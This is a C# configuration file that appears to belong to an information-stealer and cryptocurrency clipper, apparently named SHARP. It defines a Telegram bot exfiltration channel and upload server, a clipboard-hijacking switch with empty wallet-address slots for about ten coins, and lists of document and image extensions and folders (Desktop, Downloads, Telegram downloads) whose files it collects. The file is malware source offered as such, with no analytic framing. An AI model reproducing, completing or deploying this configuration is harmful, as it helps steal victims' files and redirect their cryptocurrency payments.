using System.Collections.Generic;

namespace SHARP
{
    internal class Config
    {
      public static string language = "en";
      public static string token = "";
      public static bool antiSNG = false;
      public static string id = "";
      public static bool cclipper = false;
      public static int clipboard_check_delay = 1;
      public static Dictionary<string, string> addresses = new Dictionary<string, string>()
      {
        {
          "btc1",
          ""
        },
        {
          "btc2",
          ""
        },
        {
          "usdtTRC20",
          ""
        },
        {
          "eth",
          ""
        },
        {
          "xmr",
          ""
        },
        {
          "xlm",
          ""
        },
        {
          "xrp",
          ""
        },
        {
          "ltc",
          ""
        },
        {
          "nec",
          ""
        },
        {
          "bch",
          ""
        }
      };
      public static string[] extensions = new string[9]
      {
        ".txt",
        ".png",
        ".jpg",
        ".svc",
        ".rar",
        ".zip",
        ".pdf",
        ".doc",
        "xlsx"
      };
      public static string[] dirsToCollect = new string[3]
      {
        Help.DesktopPath,
        Help.Downloads,
        Help.TGdownload
      };
      public static int sizefile = 11500000;
      public static string ApiUrl = "https://api.telegram.org/bot";
      public static string myPrivateServer = "http://127.0.0.1/uploads";
      public static OMethod.OMethods method = OMethod.OMethods.TelegramBot;
    }
}
